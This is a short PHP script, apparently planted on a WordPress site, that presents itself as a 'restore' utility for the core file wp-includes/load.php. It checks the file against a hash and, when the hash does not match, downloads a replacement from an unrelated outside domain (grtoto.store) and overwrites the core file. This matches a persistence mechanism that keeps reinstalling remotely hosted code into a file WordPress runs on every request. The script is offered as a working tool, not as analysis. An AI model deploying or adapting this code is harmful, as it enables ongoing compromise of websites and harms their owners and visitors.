<?php
$objetivo = __DIR__ . '/wp-includes/load.php';

$url_remota = 'https://grtoto.store/restore-link/tahoecbd.txt';

$hash_confiable = 'REPLACE_WITH_TRUSTED_SHA256_HASH';

function obtener_archivo_remoto($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        $datos = curl_exec($ch);
        $errno = curl_errno($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($errno || $httpcode >= 400 || $datos === false) return false;
        return $datos;
    } else {
        $opciones = [
            "http" => ["method" => "GET", "timeout" => 10],
            "ssl" => ["verify_peer" => true, "verify_peer_name" => true],
        ];
        $contexto = stream_context_create($opciones);
        $datos = @file_get_contents($url, false, $contexto);
        return $datos !== false ? $datos : false;
    }
}

if (!file_exists($objetivo) || hash_file('sha256', $objetivo) !== $hash_confiable) {
    $datos = obtener_archivo_remoto($url_remota);
    if ($datos === false) {
        echo "[restore-load] Error: No se pudo descargar el archivo remoto\n";
        exit;
    }

    if (hash('sha256', $datos) !== $hash_confiable) {
        echo "[restore-load] Error: El hash del archivo remoto no coincide, archivo no válido\n";
        exit;
    }

    if (file_exists($objetivo)) {
        @copy($objetivo, $objetivo . '.bak-' . date('Ymd-His'));
    } else {
        @mkdir(dirname($objetivo), 0755, true);
    }

    $escrito = @file_put_contents($objetivo, $datos, LOCK_EX);
    if ($escrito === false) {
        echo "[restore-load] Error: No se pudo escribir el archivo {$objetivo}\n";
        exit;
    }
    @chmod($objetivo, 0644);
    echo "[restore-load] Archivo restaurado correctamente (" . basename($objetivo) . ") en " . date('c') . "\n";
} else {
    echo "[restore-load] El archivo load.php está intacto y no necesita restauración\n";
}
